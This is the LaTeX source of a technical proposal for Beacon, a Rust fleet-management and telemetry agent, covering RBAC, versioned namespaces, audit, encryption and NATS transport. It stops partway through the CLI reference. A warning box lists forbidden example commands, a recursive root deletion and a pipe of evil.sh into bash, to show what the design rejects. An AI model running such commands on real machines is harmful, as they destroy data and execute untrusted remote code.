\documentclass[12pt,a4paper]{article}

% ─── Packages ────────────────────────────────────────────────────────────────
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[margin=1in]{geometry}
\usepackage{xcolor}
\usepackage{titlesec}
\usepackage{titletoc}
\usepackage{tocloft}
\usepackage{listings}
\usepackage{booktabs}
\usepackage{longtable}
\usepackage{array}
\usepackage{tabularx}
\usepackage{enumitem}
\usepackage{hyperref}
\usepackage{fancyhdr}
\usepackage{graphicx}
\usepackage{amsmath}
\usepackage{microtype}
\usepackage{parskip}
\usepackage{mdframed}
\usepackage{fontawesome5}
\usepackage{multicol}
\usepackage{float}
\usepackage{caption}

% ─── Colours ─────────────────────────────────────────────────────────────────
\definecolor{beaconblue}{HTML}{1A3C5E}
\definecolor{beaconaccent}{HTML}{2E86AB}
\definecolor{beacongray}{HTML}{F4F6F8}
\definecolor{beacondark}{HTML}{0D1F2D}
\definecolor{warningred}{HTML}{C0392B}
\definecolor{successgreen}{HTML}{1E8449}
\definecolor{codebg}{HTML}{F0F4F8}
\definecolor{codeframe}{HTML}{CBD5E0}
\definecolor{commentgray}{HTML}{718096}

% ─── Hyperref ────────────────────────────────────────────────────────────────
\hypersetup{
    colorlinks=true,
    linkcolor=beaconaccent,
    urlcolor=beaconaccent,
    citecolor=beaconaccent,
    pdftitle={Beacon -- Distributed Remote Operations Platform},
    pdfauthor={Beacon Project},
    pdfsubject={Technical Proposal},
}

% ─── Section Styling ─────────────────────────────────────────────────────────
\titleformat{\section}
  {\Large\bfseries\color{beaconblue}}
  {\thesection}{1em}{}[\color{beaconaccent}\titlerule]

\titleformat{\subsection}
  {\large\bfseries\color{beaconblue}}
  {\thesubsection}{1em}{}

\titleformat{\subsubsection}
  {\normalsize\bfseries\color{beacondark}}
  {\thesubsubsection}{1em}{}

\titlespacing*{\section}{0pt}{1.5em}{0.8em}
\titlespacing*{\subsection}{0pt}{1.2em}{0.5em}

% ─── Headers & Footers ───────────────────────────────────────────────────────
\pagestyle{fancy}
\fancyhf{}
\renewcommand{\headrulewidth}{0.4pt}
\renewcommand{\footrulewidth}{0.4pt}
\fancyhead[L]{\small\color{beaconblue}\textbf{Beacon} — Technical Proposal}
\fancyhead[R]{\small\color{commentgray}Confidential}
\fancyfoot[C]{\small\color{commentgray}\thepage}
\fancyfoot[R]{\small\color{commentgray}v1.0}

% ─── Listings (code blocks) ──────────────────────────────────────────────────
\lstset{
    backgroundcolor=\color{codebg},
    basicstyle=\ttfamily\small,
    breaklines=true,
    breakatwhitespace=true,
    frame=single,
    rulecolor=\color{codeframe},
    framesep=4pt,
    xleftmargin=8pt,
    xrightmargin=8pt,
    aboveskip=8pt,
    belowskip=8pt,
    tabsize=2,
    showstringspaces=false,
    commentstyle=\color{commentgray}\itshape,
    keywordstyle=\color{beaconaccent}\bfseries,
    stringstyle=\color{successgreen},
    numberstyle=\tiny\color{commentgray},
    captionpos=b,
}

\lstdefinelanguage{yaml}{
    keywords={true,false,null,yes,no},
    keywordstyle=\color{beaconaccent}\bfseries,
    sensitive=false,
    comment=[l]{\#},
    commentstyle=\color{commentgray}\itshape,
    morestring=[b]",
    morestring=[b]',
    stringstyle=\color{successgreen},
}

\lstdefinelanguage{json}{
    keywords={true,false,null},
    keywordstyle=\color{beaconaccent}\bfseries,
    sensitive=false,
    morestring=[b]",
    stringstyle=\color{successgreen},
}

% ─── Custom Boxes ─────────────────────────────────────────────────────────────
\newmdenv[
    backgroundcolor=beacongray,
    linecolor=beaconaccent,
    linewidth=2pt,
    leftline=true,
    rightline=false,
    topline=false,
    bottomline=false,
    innerleftmargin=12pt,
    innerrightmargin=8pt,
    innertopmargin=8pt,
    innerbottommargin=8pt,
]{infobox}

\newmdenv[
    backgroundcolor=warningred!8,
    linecolor=warningred,
    linewidth=2pt,
    leftline=true,
    rightline=false,
    topline=false,
    bottomline=false,
    innerleftmargin=12pt,
    innerrightmargin=8pt,
    innertopmargin=8pt,
    innerbottommargin=8pt,
]{warningbox}

\newmdenv[
    backgroundcolor=successgreen!8,
    linecolor=successgreen,
    linewidth=2pt,
    leftline=true,
    rightline=false,
    topline=false,
    bottomline=false,
    innerleftmargin=12pt,
    innerrightmargin=8pt,
    innertopmargin=8pt,
    innerbottommargin=8pt,
]{successbox}

% ─── Table of Contents Styling ───────────────────────────────────────────────
\renewcommand{\cftsecfont}{\bfseries\color{beaconblue}}
\renewcommand{\cftsecpagefont}{\bfseries\color{beaconblue}}
\renewcommand{\cftsubsecfont}{\color{beacondark}}

% ─── Document ─────────────────────────────────────────────────────────────────
\begin{document}

% ═══════════════════════════════════════════════════════════════════════════════
%  TITLE PAGE
% ═══════════════════════════════════════════════════════════════════════════════
\begin{titlepage}
    \pagecolor{beaconblue}
    \color{white}
    \centering
    \vspace*{3cm}

    {\fontsize{56}{60}\selectfont\bfseries BEACON}\\[0.5cm]
    {\color{beaconaccent}\rule{10cm}{2pt}}\\[0.8cm]
    {\Large\bfseries Remote Operations, Monitoring,}\\[0.3cm]
    {\Large\bfseries Automation \& Telemetry agent for Project}\\
    {\Large\bfseries ATLAS (Autonomous Telemetry, Logging, Analysis, and Surveillance)}\\[2cm]

    {\large Technical Design and Implementation Proposal}\\[0.4cm]

    \begin{tabular}{rl}
        \textbf{Platform:}    & Linux (x86\_64, ARM, Raspberry Pi) \\[0.3em]
        \textbf{Language:}    & Rust (async-first, Tokio runtime) \\[0.3em]
        \textbf{Transport:}   & NATS + JetStream \\[0.3em]
        \textbf{Storage:}     & SQLite (Agent) \quad PostgreSQL (Server) \\[0.3em]
        \textbf{Interface:}   & TUI(Terminal User Interface) (Ratatui) · REST API · WebSocket \\[0.3em]
        \textbf{Security:}    & RBAC · Argon2id · AES-256-GCM · TLS 1.3 \\
    \end{tabular}

    \vfill
\end{titlepage}
\nopagecolor

% ═══════════════════════════════════════════════════════════════════════════════
%  TABLE OF CONTENTS
% ═══════════════════════════════════════════════════════════════════════════════
\newpage
\tableofcontents
\newpage

% ═══════════════════════════════════════════════════════════════════════════════
%  1. EXECUTIVE SUMMARY
% ═══════════════════════════════════════════════════════════════════════════════
\section{Executive Summary}

Beacon is a \textbf{production-grade, distributed Linux operations and aobeservability enable agent } written entirely in Rust. It enables administrators to manage fleets of Linux systems remotely through approved automation workflows, real-time telemetry collection, secure execution engines, immutable audit trails, and offline-capable local operation.

It is an \textbf{operations platform} — comparable in architecture to components found in systems such as Salt, Ansible, Rundeck, Zabbix, Prometheus, and osquery — while remaining purpose-built, Rust-native, and deployable on hardware as constrained as a Raspberry Pi.

\begin{infobox}
\textbf{Key Design Principles}
\begin{itemize}[noitemsep]
    \item No arbitrary shell execution — all operations are approved and versioned
    \item Offline-first: agents continue collecting, logging, auditing, and queuing without connectivity
    \item RBAC enforced at every boundary: CLI, TUI, REST, WebSocket, Scheduler, Database
    \item Immutable audit trails — not even Captain can delete audit records
    \item Encryption at rest (AES-256-GCM) and in transit (TLS 1.3)
    \item Single agent scales from Raspberry Pi to large fleet
\end{itemize}
\end{infobox}

% ═══════════════════════════════════════════════════════════════════════════════
%  2. SYSTEM ARCHITECTURE
% ═══════════════════════════════════════════════════════════════════════════════
\section{System Architecture}

\subsection{Binary Topology}

Beacon ships as two separate binaries:

\begin{center}
\begin{tabularx}{0.85\textwidth}{>{\bfseries}lX}
\toprule
Binary & Description \\
\midrule
\texttt{beacon-server} & Central management server. Manages authentication, RBAC, namespace definitions, group orchestration, metrics aggregation, scheduling, audit storage, and the NATS gateway. \\[0.5em]
\texttt{beacon-agent}  & Installed on every managed Linux machine. Executes operations locally, collects telemetry, maintains local SQLite databases, buffers data offline, and communicates with the server exclusively via NATS. \\
\bottomrule
\end{tabularx}
\end{center}

A single Beacon Server is designed to manage 1 to 1\,000+ agents without architectural changes.

\subsection{High-Level Communication Flow}

\begin{lstlisting}[language=bash, caption={System Data Flow}]
Users
  |
  v
Beacon Server
  +-- Authentication & RBAC
  +-- Audit System
  +-- Namespace Manager
  +-- Group Manager
  +-- Metrics Manager
  +-- API Server (REST + WebSocket)
  +-- NATS Client
  |
  v
NATS + JetStream (Transport Layer)
  +-- Commands
  +-- Metrics
  +-- Logs
  +-- Events / Audit Events
  +-- Heartbeats
  |
  v
Beacon Agents (1 ... N)
\end{lstlisting}

\subsection{Agent Engine Architecture}

Every agent is composed of independent, purpose-scoped engines:

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Identity Engine
    \item Authentication Engine
    \item Authorization Engine
    \item Configuration Engine
    \item Namespace Engine
    \item Execution Engine
    \item Scheduler Engine
    \item Metrics Engine
    \item Logging Engine
    \item Audit Engine
    \item Encryption Engine
    \item Queue Engine
    \item Storage Engine
    \item API Engine
    \item WebSocket Engine
    \item Service Engine
    \item Health Engine
    \item Recovery Engine
    \item Plugin Engine
\end{itemize}
\end{multicols}

% ═══════════════════════════════════════════════════════════════════════════════
%  3. CORE DESIGN PRINCIPLES
% ═══════════════════════════════════════════════════════════════════════════════
\section{Core Design Principles}

\subsection{The Approved Operations Model}

Beacon is \textbf{not} a shell wrapper. Arbitrary shell execution is strictly forbidden at every layer.

\begin{warningbox}
\textbf{Forbidden Operations — Will Never Be Supported}
\begin{lstlisting}[language=bash]
beacon exec "rm -rf /"
beacon exec "curl evil.sh | bash"
beacon namespace add-command "user supplied shell"
\end{lstlisting}
\end{warningbox}

All execution occurs through \textbf{approved, versioned operations} contained within namespaces:

\begin{lstlisting}[language=json, caption={Example namespace operation definition}]
{
  "namespace": "update_system",
  "operations": [
    { "type": "update_packages" },
    { "type": "upgrade_packages" },
    { "type": "autoremove_packages" }
  ]
}
\end{lstlisting}

\subsection{Supported Operation Categories}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Package Operations
    \item Service Operations
    \item File Operations
    \item Directory Operations
    \item User Operations
    \item Group Operations
    \item Backup Operations
    \item Network Operations
    \item Container Operations
    \item System Operations
    \item Custom Plugin Operations
\end{itemize}
\end{multicols}

Every operation definition must include:

\begin{center}
\begin{tabularx}{0.75\textwidth}{lX}
\toprule
Field & Purpose \\
\midrule
\texttt{operation\_id}  & Unique stable identifier \\
\texttt{version}        & Immutable version reference \\
\texttt{inputs}         & Declared input parameters \\
\texttt{outputs}        & Declared output schema \\
\texttt{timeout}        & Maximum allowed runtime \\
\texttt{required\_role} & Minimum RBAC role to execute \\
\texttt{audit\_policy}  & What to record and retain \\
\texttt{rollback\_policy} & How to reverse the operation \\
\bottomrule
\end{tabularx}
\end{center}

% ═══════════════════════════════════════════════════════════════════════════════
%  4. IDENTITY ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Identity Engine}

Each agent generates a unique, stable \texttt{app\_id} (agent identity) derived from hardware and environment characteristics:

\begin{itemize}[noitemsep]
    \item Machine ID (\texttt{/etc/machine-id})
    \item Hostname
    \item CPU serial number
    \item RAM configuration
    \item Motherboard UUID
    \item First boot timestamp
    \item Random 256-bit salt
\end{itemize}

These inputs are combined and hashed using \textbf{SHA-256}. The result is stored permanently. \textbf{Only a Captain role may trigger regeneration}. All generated data carries:

\begin{center}
\begin{tabular}{ll}
\toprule
Field & Description \\
\midrule
\texttt{app\_id} & Stable agent identity \\
\texttt{timestamp} & Generation time \\
\texttt{sequence\_number} & Monotonic counter \\
\texttt{schema\_version} & Data schema version \\
\bottomrule
\end{tabular}
\end{center}

On first startup the agent registers itself with the server via NATS, transmitting: \texttt{agent\_id}, \texttt{hostname}, \texttt{os}, \texttt{architecture}, \texttt{version}, \texttt{last\_seen}, \texttt{status}, and \texttt{tags}.

% ═══════════════════════════════════════════════════════════════════════════════
%  5. AUTHENTICATION & AUTHORIZATION
% ═══════════════════════════════════════════════════════════════════════════════
\section{Authentication \& Authorization}

\subsection{Roles}

Beacon implements a three-tier RBAC model:

\begin{center}
\begin{tabularx}{\textwidth}{lX}
\toprule
Role & Capabilities \\
\midrule
\textbf{Viewer} &
  View metrics, logs, namespaces, groups, agents, executions, audit history.
  Export logs and metrics. No write or execute access. \\[0.5em]
\textbf{Commander} &
  Everything Viewer can do, plus: execute namespaces and groups, pause/resume/stop
  executions. Cannot create, edit, or delete resources. Cannot manage users or
  configuration. \\[0.5em]
\textbf{Captain} &
  Full administrative control. User CRUD, namespace and group CRUD, scheduling,
  password management, database operations, backup management, configuration changes,
  encryption management, metrics configuration, agent management, audit management. \\
\bottomrule
\end{tabularx}
\end{center}

\subsection{Password Storage}

All passwords are stored using \textbf{Argon2id}. Plaintext storage is prohibited at every layer.

\subsection{Password Recovery}

\begin{itemize}[noitemsep]
    \item \textbf{Primary recovery}: Recovery Key generated at initialization (format: \texttt{AB2F-D921-882C-771F}; regex: \texttt{\textasciicircum{}[A-F0-9]\{4\}-[A-F0-9]\{4\}-[A-F0-9]\{4\}-[A-F0-9]\{3\}\$}). The user must save this key securely.
    \item \textbf{Optional secondary}: Security question \textit{What is your favourite food?} (configured post-initialization, used only as a secondary factor).
\end{itemize}

All password resets are recorded in the immutable audit log.

\subsection{RBAC Enforcement Scope}

RBAC is enforced at \textbf{every boundary} — UI restrictions alone are not acceptable:

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item CLI
    \item TUI
    \item REST API
    \item WebSocket API
    \item Scheduler
    \item Execution Engine
    \item Database Actions
    \item Configuration Actions
    \item NATS Publishing
    \item Administrative Operations
\end{itemize}
\end{multicols}

\subsection{Namespace-Level RBAC}

Each namespace carries its own minimum role requirement:

\begin{lstlisting}[language=yaml, caption={Namespace RBAC configuration}]
restart_nginx:
  required_role: commander

create_admin_user:
  required_role: captain

read_disk_usage:
  required_role: viewer
\end{lstlisting}

Commanders cannot execute namespaces requiring a role above their own. The server validates this server-side on every request.

\subsection{Authentication Token Model}

\begin{itemize}[noitemsep]
    \item Username/password login produces a short-lived \textbf{JWT access token}
    \item A \textbf{refresh token} enables session renewal without re-authentication
    \item Session expiration is enforced; all login events are logged
\end{itemize}

% ═══════════════════════════════════════════════════════════════════════════════
%  6. NAMESPACE SYSTEM
% ═══════════════════════════════════════════════════════════════════════════════
\section{Namespace System}

\subsection{Definition}

A \textbf{namespace} is a reusable, versioned automation workflow consisting of one or more approved operations executed in sequence.

\subsection{Versioning}

Every namespace is \textbf{immutable} once published. Updates create a new version:

\begin{lstlisting}[language=bash]
update_system_v1   # Original
update_system_v2   # Added autoremove step
update_system_v3   # Added reboot check
\end{lstlisting}

Execution references a specific version. Running executions never switch versions mid-flight.

\subsection{Namespace Groups}

Namespaces can be composed into ordered groups:

\begin{lstlisting}[language=bash, caption={Example: Server Provisioning Group}]
provision_server:
  1. install_packages
  2. configure_firewall
  3. create_users
  4. start_services
\end{lstlisting}

Groups support ordered execution, reordering, individual namespace enable/disable, and group-level execution history.

\subsection{Agent Tags}

Agents can be tagged and namespaces executed against tag sets:

\begin{lstlisting}[language=bash]
beacon namespace run update_system --tag production
beacon namespace run audit_logs    --tag database
beacon group run provision_server  --tag staging
\end{lstlisting}

Supported built-in tags: \texttt{production}, \texttt{staging}, \texttt{testing}, \texttt{database}, \texttt{web}, \texttt{edge}, \texttt{raspberrypi}.

% ═══════════════════════════════════════════════════════════════════════════════
%  7. EXECUTION ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Execution Engine}

\subsection{Execution Record}

Every execution is assigned a full identity record:

\begin{center}
\begin{tabular}{ll}
\toprule
Field & Description \\
\midrule
\texttt{execution\_id} & Unique execution identifier \\
\texttt{namespace\_version} & Pinned version at time of launch \\
\texttt{initiator} & Authenticated user / scheduler \\
\texttt{timestamp} & UTC start time \\
\texttt{status} & Current state \\
\bottomrule
\end{tabular}
\end{center}

\subsection{Execution States}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item \texttt{Pending}
    \item \texttt{Queued}
    \item \texttt{Running}
    \item \texttt{Paused}
    \item \texttt{Completed}
    \item \texttt{Failed}
    \item \texttt{Cancelled}
    \item \texttt{TimedOut}
\end{itemize}
\end{multicols}

\subsection{Execution Lock Manager}

Per-namespace lock modes prevent execution collisions:

\begin{lstlisting}[language=yaml, caption={Lock mode configuration}]
update_system:
  lock_mode: deny      # Reject concurrent runs entirely

deploy_service:
  lock_mode: queue     # Queue additional requests

restart_nginx:
  lock_mode: replace   # Cancel queued, run new

collect_stats:
  lock_mode: parallel  # Allow simultaneous runs
\end{lstlisting}

\subsection{Resource Controls}

\begin{lstlisting}[language=yaml, caption={Global resource limits}]
max_parallel_executions: 10
max_queue_size: 10000
max_ws_clients: 100
max_log_rate: 1000/sec
max_metric_rate: 1000/sec
\end{lstlisting}

Requests exceeding these limits are rejected with appropriate error responses.

% ═══════════════════════════════════════════════════════════════════════════════
%  8. SCHEDULER ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Scheduler Engine}

\subsection{Schedule Types}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Every Minute
    \item Every Hour
    \item Every Day
    \item Every Week
    \item Every Month
    \item On Boot
    \item Cron Expression
\end{itemize}
\end{multicols}

\subsection{Execution Policies}

When a schedule fires while a prior execution is still active:

\begin{center}
\begin{tabular}{ll}
\toprule
Policy & Behaviour \\
\midrule
\texttt{Skip}     & Do not start a new execution \\
\texttt{Queue}    & Enqueue behind running execution \\
\texttt{Replace}  & Cancel queued, start new \\
\texttt{Parallel} & Allow concurrent execution \\
\bottomrule
\end{tabular}
\end{center}

\subsection{Missed Schedule Handling}

\begin{center}
\begin{tabular}{ll}
\toprule
Policy & Behaviour \\
\midrule
\texttt{ExecuteImmediately} & Run as soon as agent is available \\
\texttt{Ignore}             & Silently skip the missed window \\
\texttt{Queue}              & Enqueue the missed execution \\
\bottomrule
\end{tabular}
\end{center}

\subsection{Maintenance Windows}

\begin{lstlisting}[language=bash]
beacon maintenance enable production   # Suppress dangerous ops
beacon maintenance disable production  # Resume normal scheduling
\end{lstlisting}

% ═══════════════════════════════════════════════════════════════════════════════
%  9. METRICS ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Metrics Engine}

\subsection{Collectors}

\begin{center}
\begin{tabularx}{\textwidth}{lX}
\toprule
Collector & Metrics \\
\midrule
\textbf{CPU} & Usage, per-core usage, frequency, temperature, context switches, interrupts, load average \\
\textbf{RAM} & Total, used, free, cached, buffers, swap \\
\textbf{Storage} & Capacity, usage, IOPS, throughput, latency \\
\textbf{Network} & RX/TX bytes, errors, connections, interface status \\
\textbf{Processes} & PID, name, user, CPU\%, memory\%, start time \\
\textbf{Mounted Drives} & Filesystem, mount path, capacity, usage \\
\textbf{Kernel} & Kernel version, distribution, uptime, hostname, architecture \\
\textbf{Services} & Status, restart count, last changed \\
\textbf{Temperature} & Per-sensor readings \\
\textbf{Power} & Battery state, AC/DC status \\
\textbf{Containers} & Container ID, name, CPU/RAM usage, status \\
\textbf{Kubernetes Logs} & Timestamp, namespace, pod, container, node, stream (stdout/stderr), log message \\
\bottomrule
\end{tabularx}
\end{center}

\subsection{Collector Health Tracking}

Each collector independently tracks:

\begin{center}
\begin{tabular}{ll}
\toprule
Field & Type \\
\midrule
\texttt{last\_run} & Timestamp \\
\texttt{last\_success} & Timestamp \\
\texttt{last\_failure} & Timestamp \\
\texttt{failure\_count} & Counter \\
\texttt{status} & \texttt{Healthy | Degraded | Failed | Disabled} \\
\bottomrule
\end{tabular}
\end{center}

\subsection{Data Retention}

\begin{center}
\begin{tabular}{lll}
\toprule
Resolution & Interval & Retention \\
\midrule
Raw        & 1 second  & 24 hours \\
Rollup     & 1 minute  & 30 days \\
Rollup     & 1 hour    & 365 days \\
\bottomrule
\end{tabular}
\end{center}

Automatic pruning is applied to all tiers. Process identity uses the triple \texttt{(pid, boot\_id, start\_time)} to avoid PID reuse ambiguity.

\subsection{Metrics Configuration}

\begin{lstlisting}[language=bash, caption={Metrics management commands}]
beacon cpu enable / disable
beacon ram enable / disable
beacon storage enable / disable
beacon network enable / disable
beacon process enable / disable
beacon drives enable / disable
beacon system enable / disable

beacon metrics enable-all
beacon metrics disable-all
beacon metrics interval 1s
beacon metrics interval 5s
beacon metrics interval 30s
beacon metrics interval 1m
beacon metrics retention 30d
\end{lstlisting}

% ═══════════════════════════════════════════════════════════════════════════════
%  10. LOGGING ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Logging Engine}

Every event generates a structured log entry:

\begin{lstlisting}[language=json, caption={Log entry schema}]
{
  "timestamp":    "2024-01-15T14:23:01.123Z",
  "app_id":       "sha256:a3f1...",
  "execution_id": "exec-00421",
  "namespace":    "update_system",
  "severity":     "Info",
  "source":       "execution_engine",
  "message":      "Package upgrade completed successfully"
}
\end{lstlisting}

\subsection{Severity Levels}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item \texttt{Trace}
    \item \texttt{Debug}
    \item \texttt{Info}
    \item \texttt{Warning}
    \item \texttt{Error}
    \item \texttt{Critical}
\end{itemize}
\end{multicols}

Severity is \textbf{never inferred from stdout}. It must be explicitly assigned by the producing subsystem.

% ═══════════════════════════════════════════════════════════════════════════════
%  11. IMMUTABLE AUDIT ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Immutable Audit Engine}

\begin{warningbox}
\textbf{Audit records cannot be deleted or modified — not even by the Captain role.}
\end{warningbox}

\subsection{Audited Events}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Login / Logout
    \item Namespace execution
    \item Password resets
    \item User creation / deletion
    \item Agent removal
    \item Configuration changes
    \item Encryption key rotation
    \item RBAC changes
    \item All failed actions
    \item All unauthorized attempts
\end{itemize}
\end{multicols}

\subsection{Permitted Audit Operations}

\begin{successbox}
\textbf{Allowed:} Archive, Export, Compress, Verify \\
\textbf{Forbidden:} Delete, Modify, Rewrite
\end{successbox}

% ═══════════════════════════════════════════════════════════════════════════════
%  12. STORAGE ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Storage Engine}

\subsection{Agent Storage (SQLite)}

The agent uses five dedicated SQLite databases to avoid lock contention:

\begin{center}
\begin{tabular}{ll}
\toprule
Database & Contents \\
\midrule
\texttt{config.db}  & Agent configuration, namespace definitions \\
\texttt{metrics.db} & Metric time-series data, rollups \\
\texttt{logs.db}    & Structured event logs \\
\texttt{audit.db}   & Immutable audit records \\
\texttt{queue.db}   & Outbound message queue \\
\bottomrule
\end{tabular}
\end{center}

All databases operate with WAL mode, periodic VACUUM, integrity checks, and scheduled backups.

\subsection{Server Storage (PostgreSQL)}

The server uses PostgreSQL for all persistent state:

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Users \& Roles
    \item Agents \& Tags
    \item Namespace Definitions
    \item Groups
    \item Metrics History
    \item Audit Events
    \item Log Aggregates
    \item Schedules
    \item Configurations
    \item Execution History
\end{itemize}
\end{multicols}

% ═══════════════════════════════════════════════════════════════════════════════
%  13. QUEUE ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Queue Engine}

\subsection{Message States}

All outbound data passes through the queue:

\begin{center}
\begin{tabular}{ll}
\toprule
State & Description \\
\midrule
\texttt{Pending}    & Awaiting dispatch \\
\texttt{Processing} & Actively being sent \\
\texttt{Sent}       & Successfully delivered \\
\texttt{Failed}     & Delivery attempt failed \\
\texttt{DeadLetter} & Exhausted max retry attempts \\
\bottomrule
\end{tabular}
\end{center}

After \texttt{max\_retries: 5} failures, messages enter the Dead Letter Queue for manual inspection and optional replay.

\subsection{Offline Buffering}

During network loss the agent continues all local operations without interruption:

\begin{itemize}[noitemsep]
    \item Continue collecting metrics
    \item Continue logging events
    \item Continue auditing actions
    \item Continue queueing outbound data
\end{itemize}

On connectivity restoration, all queued data replays automatically in order.

% ═══════════════════════════════════════════════════════════════════════════════
%  14. ENCRYPTION ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Encryption Engine}

\subsection{Encryption Scheme}

\begin{center}
\begin{tabular}{ll}
\toprule
Layer & Algorithm \\
\midrule
Transport                & TLS 1.3 \\
Payload (optional)       & AES-256-GCM \\
Key Derivation           & Argon2id from master password \\
Log Encryption (optional)& AES-256-GCM \\
\bottomrule
\end{tabular}
\end{center}

\subsection{Encrypted Data}

\begin{itemize}[noitemsep]
    \item Queued outbound payloads
    \item Stored credentials
    \item Sensitive configuration values
    \item Optionally: full log storage
\end{itemize}

\subsection{Key Rotation}

Key rotation is an atomic operation with rollback support:

\begin{lstlisting}[language=bash, caption={Key rotation process}]
1. Generate new AES-256-GCM key
2. Decrypt all existing data with current key
3. Re-encrypt with new key
4. Verify all data integrity
5. Commit rotation
   (Rollback supported at any step)
\end{lstlisting}

% ═══════════════════════════════════════════════════════════════════════════════
%  15. TRANSPORT: NATS + JETSTREAM
% ═══════════════════════════════════════════════════════════════════════════════
\section{Transport: NATS + JetStream}

\subsection{Why NATS?}

NATS JetStream provides out-of-the-box:

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Durable messaging
    \item Replay semantics
    \item Acknowledgements
    \item Consumer groups
    \item Message persistence
    \item Retry handling
    \item Stream retention policies
    \item Dead-letter queues
\end{itemize}
\end{multicols}

There is no need to implement custom queueing for inter-component communication.

\subsection{Subject Naming Convention}

\begin{lstlisting}[language=bash, caption={NATS subject hierarchy}]
beacon.agent.<agent_id>.commands
beacon.agent.<agent_id>.logs
beacon.agent.<agent_id>.metrics
beacon.agent.<agent_id>.audit
beacon.agent.<agent_id>.heartbeat

beacon.group.<tag>.commands       # Tag-based targeting
beacon.all.commands               # Broadcast to all agents
\end{lstlisting}

\subsection{NATS Security / ACLs}

NATS is transport only. RBAC lives entirely inside Beacon Server. Agents make no authorization decisions.

Example ACL for a single agent:

\begin{lstlisting}[language=yaml, caption={Agent001 NATS ACL}]
Agent001:
  publish:
    - beacon.agent.agent001.logs
    - beacon.agent.agent001.metrics
    - beacon.agent.agent001.audit
    - beacon.agent.agent001.heartbeat
  subscribe:
    - beacon.agent.agent001.commands
  # No other subjects permitted
\end{lstlisting}

Least privilege is applied to every agent identity.

% ═══════════════════════════════════════════════════════════════════════════════
%  16. REST API
% ═══════════════════════════════════════════════════════════════════════════════
\section{REST API}

All REST endpoints are RBAC-protected. Everything available locally must be available remotely.

\subsection{Agent API Endpoints}

\begin{lstlisting}[language=bash]
/auth         /users        /namespaces
/executions   /logs         /metrics
/audit        /config       /queue
/system
\end{lstlisting}

\subsection{Server API Endpoints}

\begin{lstlisting}[language=bash]
/api/v1/auth         /api/v1/users
/api/v1/agents       /api/v1/namespaces
/api/v1/groups       /api/v1/executions
/api/v1/logs         /api/v1/metrics
/api/v1/audit        /api/v1/config
/api/v1/backups
\end{lstlisting}

% ═══════════════════════════════════════════════════════════════════════════════
%  17. WEBSOCKET ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{WebSocket Engine}

Clients subscribe to specific channels rather than receiving a global broadcast:

\begin{lstlisting}[language=json, caption={WebSocket subscription example}]
{
  "channel":   "logs",
  "namespace": "update_system",
  "agent_id":  "agent001"
}
\end{lstlisting}

\subsection{Available Channels}

\begin{multicols}{2}
\begin{itemize}[noitemsep,leftmargin=*]
    \item \texttt{logs}
    \item \texttt{metrics}
    \item \texttt{executions}
    \item \texttt{audit}
    \item \texttt{health}
\end{itemize}
\end{multicols}

% ═══════════════════════════════════════════════════════════════════════════════
%  18. HEALTH ENGINE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Health Engine}

The agent reports a system-level health state visible in both TUI and REST API:

\begin{center}
\begin{tabular}{ll}
\toprule
State & Description \\
\midrule
\texttt{BOOTING}           & Initial startup sequence \\
\texttt{INITIALIZING}      & First-time setup \\
\texttt{ONLINE}            & Fully operational \\
\texttt{DEGRADED}          & One or more subsystems impaired \\
\texttt{OFFLINE\_BUFFERING}& Network lost, buffering locally \\
\texttt{RECOVERING}        & Restoring from failure \\
\texttt{FAILED}            & Critical subsystem failure \\
\texttt{SHUTTING\_DOWN}    & Graceful shutdown in progress \\
\bottomrule
\end{tabular}
\end{center}

% ═══════════════════════════════════════════════════════════════════════════════
%  19. TUI
% ═══════════════════════════════════════════════════════════════════════════════
\section{Terminal User Interface (TUI)}

Built using \textbf{Ratatui}. The TUI provides full management capability equivalent to the CLI and REST API.

\subsection{Views}

\begin{multicols}{3}
\begin{itemize}[noitemsep,leftmargin=*]
    \item Dashboard
    \item Agents
    \item Namespaces
    \item Groups
    \item Executions
    \item Metrics
    \item Logs
    \item Audit
    \item Queue
    \item Users
    \item Configuration
    \item System Health
    \item Collectors
    \item Plugins
\end{itemize}
\end{multicols}

\subsection{TUI Requirements}

\begin{itemize}[noitemsep]
    \item Keyboard-driven navigation
    \item Live data updates (WebSocket-backed)
    \item Search and filtering on all views
    \item Role-aware menu visibility (Viewers cannot see execution controls)
\end{itemize}

% ═══════════════════════════════════════════════════════════════════════════════
%  20. PLUGIN ARCHITECTURE
% ═══════════════════════════════════════════════════════════════════════════════
\section{Plugin Architecture}

Beacon supports a first-class plugin system for extending core capabilities:

\begin{center}
\begin{tabular}{ll}
\toprule
Plugin Type & Purpose \\
\midrule
Metric Collectors & Custom hardware/software telemetry \\
Operations        & New approved operation types \\
Exporters         & Push data to external systems (Prometheus, Grafana) \\
Notifications     & Alert channels (Slack, PagerDuty, email) \\
Integrations      & Third-party system connectors \\
\bottomrule
\end{tabular}
\end{center}

Plugin isolation requirements:

\begin{itemize}[noitemsep]
    \item Declared permission scope
    \item Cryptographic signing
    \item Independent versioning
    \item Health and status tracking
\end{itemize}

% ═══════════════════════════════════════════════════════════════════════════════
%  21. CLI REFERENCE
% ═══════════════════════════════════════════════════════════════════════════════
\section{CLI Reference}

\subsection{Installation \& Service}

\begin{lstlisting}[language=bash]
beacon install / uninstall
